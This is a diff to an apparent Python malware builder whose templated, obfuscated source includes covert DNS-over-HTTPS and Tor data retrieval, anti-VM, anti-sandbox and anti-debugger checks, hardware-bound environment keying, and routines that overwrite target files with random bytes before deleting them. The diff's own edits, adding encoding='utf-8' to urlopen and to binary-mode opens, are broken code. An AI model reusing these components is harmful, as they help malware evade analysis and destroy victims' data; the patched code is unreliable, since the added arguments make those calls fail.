@@ -1869,7 +1869,7 @@ DOH_SOURCE = r'''def {FUNC_DOH}(domain):
         pass
         url = f"https://dns.google/resolve?name={{domain}}&type=TXT"
         req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={{"User-Agent": "Mozilla/5.0"}})
-        with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5) as r:
+        with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5, encoding='utf-8') as r:
             data = _nixon_ジェイソン제이슨.loads(r.read())
             if "Answer" in data:
                 return data["Answer"][0]["data"].strip('"')
@@ -1916,7 +1916,7 @@ class {OPAQUE_CONST_CLS}:
                 paths = ["/sys/class/thermal/thermal_zone0/temp", "/sys/class/hwmon/hwmon0/temp1_input"]
                 for path in paths:
                     try:
-                        with open(path, "r") as f:
+                        with open(path, "r", encoding='utf-8') as f:
                             temp = int(f.read().strip())
                             return temp % 65537
                     except: continue
@@ -2042,7 +2042,7 @@ class {ENV_KEYING_CLS}:
     def _get_cpu_id(self):
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/cpuinfo", "r") as f:
+                with open("/proc/cpuinfo", "r", encoding='utf-8') as f:
                     for line in f:
                         if "model name" in line:
                             return _nixon_ハッシュ해시.sha256(line.encode()).hexdigest()[:16]
@@ -2089,14 +2089,14 @@ class {ENV_KEYING_CLS}:
     def _get_bios_version(self):
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/sys/class/dmi/id/bios_version", "r") as f:
+                with open("/sys/class/dmi/id/bios_version", "r", encoding='utf-8') as f:
                     return f.read().strip()[:16]
         except: pass
         return "unknown_bios"
     def _get_bios_date(self):
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/sys/class/dmi/id/bios_date", "r") as f:
+                with open("/sys/class/dmi/id/bios_date", "r", encoding='utf-8') as f:
                     return f.read().strip()[:16]
         except: pass
         return "unknown_date"
@@ -2111,7 +2111,7 @@ class {ENV_KEYING_CLS}:
     def _get_memory_size(self):
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/meminfo", "r") as f:
+                with open("/proc/meminfo", "r", encoding='utf-8') as f:
                     for line in f:
                         if "MemTotal" in line:
                             mem_kb = int(line.split()[1])
@@ -2192,7 +2192,7 @@ class {HW_PERF_CLS}:
     def {METHOD_CPUID_HYPERVISOR}(self):
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/cpuinfo", "r") as f:
+                with open("/proc/cpuinfo", "r", encoding='utf-8') as f:
                     content = f.read()
                     if "hypervisor" in content: return True
         except: pass
@@ -2201,7 +2201,7 @@ class {HW_PERF_CLS}:
         fp = []
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/cpuinfo", "r") as f:
+                with open("/proc/cpuinfo", "r", encoding='utf-8') as f:
                     for line in f:
                         if "microcode" in line:
                             fp.append(line.strip())
@@ -2399,7 +2399,7 @@ class {ANTI_EMULATOR_CLS}:
             return True
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/cpuinfo", "r") as f:
+                with open("/proc/cpuinfo", "r", encoding='utf-8') as f:
                     content = f.read()
                     return "rdrand" in content.lower()
         except: pass
@@ -2434,7 +2434,7 @@ class {ANTI_EMULATOR_CLS}:
     def {METHOD_CPUID_HYPERVISOR}():
         try:
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/cpuinfo", "r") as f:
+                with open("/proc/cpuinfo", "r", encoding='utf-8') as f:
                     content = f.read().lower()
                     hypervisor_flags = ["hypervisor", "vmware", "kvm", "xen", "virtualbox", "hyper-v"]
                     for flag in hypervisor_flags:
@@ -2459,7 +2459,7 @@ class {ANTI_EMULATOR_CLS}:
         try:
             for filepath in vm_files:
                 try:
-                    with open(filepath, "r") as f:
+                    with open(filepath, "r", encoding='utf-8') as f:
                         content = f.read().lower()
                         for indicator in vm_indicators:
                             if indicator in content:
@@ -2823,7 +2823,7 @@ class {KEY_SHARD_CLS}:
                 resp = self._tor.request(url)
                 if not resp:
                     req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-                    with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5) as r:
+                    with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5, encoding='utf-8') as r:
                         resp = r.read()
                 data = _nixon_ジェイソン제이슨.loads(resp)
                 shards.append((int(data['x']), int(data['y'])))
@@ -2864,7 +2864,7 @@ HARDENING_SOURCE = r'''class {CLS_HARD}:
         import platform as _p_
         if _p_.system() != "Linux": return True
         try:
-            with open("/proc/self/status", "r") as f:
+            with open("/proc/self/status", "r", encoding='utf-8') as f:
                 content = f.read()
                 if "TracerPid:\t0" not in content:
                     return False
@@ -2879,7 +2879,7 @@ HARDENING_SOURCE = r'''class {CLS_HARD}:
             for kf in known_files:
                 if _o_.path.exists(kf): 
                     try:
-                        with open(kf) as f:
+                        with open(kf, encoding='utf-8') as f:
                             data = f.read().lower()
                             if "ec2" in data or "google" in data: return True
                     except: pass
@@ -2923,7 +2923,7 @@ HARDENING_SOURCE = r'''class {CLS_HARD}:
         # artifact on its next exec.  TracerPid answers the same question
         # with no side effect.
         try:
-            with open("/proc/self/status") as _f_:
+            with open("/proc/self/status", encoding='utf-8') as _f_:
                 for _ln_ in _f_:
                     if _ln_.startswith("TracerPid:"):
                         return _ln_.split(":", 1)[1].strip() == "0"
@@ -2937,7 +2937,7 @@ HARDENING_SOURCE = r'''class {CLS_HARD}:
         if _p_.system() != "Linux": return True
         try:
             ppid = _o_.getppid()
-            with open(f"/proc/{ppid}/comm", "r") as f:
+            with open(f"/proc/{ppid}/comm", "r", encoding='utf-8') as f:
                 name = f.read().strip()
             bad_parents = ["gdb", "strace", "ltrace", "ida", "radare2"]
             for bp in bad_parents:
@@ -4681,7 +4681,7 @@ class {CROSS_PLATFORM_GUARD_CLS}:
             import os
             my_pid = os.getpid()
             tracer_pid = 0
-            with open("/proc/self/status", "r") as f:
+            with open("/proc/self/status", "r", encoding='utf-8') as f:
                 for line in f:
                     if line.startswith("TracerPid:"):
                         tracer_pid = int(line.split(":")[1].strip())
@@ -5083,7 +5083,7 @@ class {ANTI_SANDBOX_CLS}:
             if _nixon_オペレーション운영.cpu_count() < 2: return True
             if _nixon_プラットフォーム플랫폼.system() == "Linux":
                 try:
-                    with open("/proc/meminfo", "r") as f:
+                    with open("/proc/meminfo", "r", encoding='utf-8') as f:
                         for line in f:
                             if "MemTotal" in line:
                                 kb = int(line.split()[1])
@@ -5561,7 +5561,7 @@ def {FUNC_FRIDA}():
     if {IS_DEBUG}: _打印輸出한글ไทย("[DEBUG] Entering Frida Check")
     try:
         if _nixon_プラットフォーム플랫폼.system() == "Linux":
-            with open("/proc/self/maps", "r") as f:
+            with open("/proc/self/maps", "r", encoding='utf-8') as f:
                 m = f.read().lower()
                 for s in ["frida", "gadget", "xposed", "substrate", "cydia", "gum-js-loop"]:
                     if s in m: return True
@@ -5811,7 +5811,7 @@ def _nx_mac():
         for _n in sorted(_o.listdir("/sys/class/net")):
             if _n == "lo": continue
             try:
-                with open("/sys/class/net/" + _n + "/address") as _f:
+                with open("/sys/class/net/" + _n + "/address", encoding='utf-8') as _f:
                     _m = _f.read().strip().lower().replace(":", "")
             except Exception: continue
             if len(_m) == 12 and _m != "0" * 12: return _m
@@ -6332,7 +6332,7 @@ def {FUNC_LIVE_CHK}():
                             for bad in bad_mods:
                                 if bad in name: digest.update(b"BAD_MOD")
             elif _nixon_プラットフォーム플랫폼.system() == "Linux":
-                with open("/proc/self/maps", "r") as f:
+                with open("/proc/self/maps", "r", encoding='utf-8') as f:
                     content = f.read().lower()
                     for bad in bad_mods:
                         if bad in content: digest.update(b"BAD_MOD")
@@ -6404,10 +6404,10 @@ def {FUNC_HW_BIND}():
         if _nixon_プラットフォーム플랫폼.system() == "Linux":
             ids.append(str(_nixon_オペレーション운영.stat("/").st_ino))
             try:
-                with open("/_nixon_システム시스템/class/dmi/id/product_uuid", "r") as f: ids.append(f.read().strip())
+                with open("/_nixon_システム시스템/class/dmi/id/product_uuid", "r", encoding='utf-8') as f: ids.append(f.read().strip())
             except: pass
             try:
-                with open("/etc/machine-id", "r") as f: ids.append(f.read().strip())
+                with open("/etc/machine-id", "r", encoding='utf-8') as f: ids.append(f.read().strip())
             except: pass
             try:
                 if _nixon_オペレーション운영.path.exists("/system/build.prop"):
@@ -6661,7 +6661,7 @@ def {FUNC_BOOT}():
                     if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                         try:
                             sz = _nixon_オペレーション운영.path.getsize(t)
-                            with open(t, "rb+") as f: f.write(_nixon_オペレーション운영.urandom(sz))
+                            with open(t, "rb+", encoding='utf-8') as f: f.write(_nixon_オペレーション운영.urandom(sz))
                         except: pass
                         try:
                             try: _nixon_オペレーション운영.chmod(t, 0o600)
@@ -6867,7 +6867,7 @@ def {FUNC_BOOT}():
                     for t in targets:
                         if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                             sz = _nixon_オペレーション운영.path.getsize(t)
-                            with open(t, "rb+") as f: f.write(_nixon_オペレーション운영.urandom(sz))
+                            with open(t, "rb+", encoding='utf-8') as f: f.write(_nixon_オペレーション운영.urandom(sz))
                             try: _nixon_オペレーション운영.rename(t, t + ".corrupted")
                             except: pass
                             try: _nixon_オペレーション운영.unlink(t + ".corrupted")
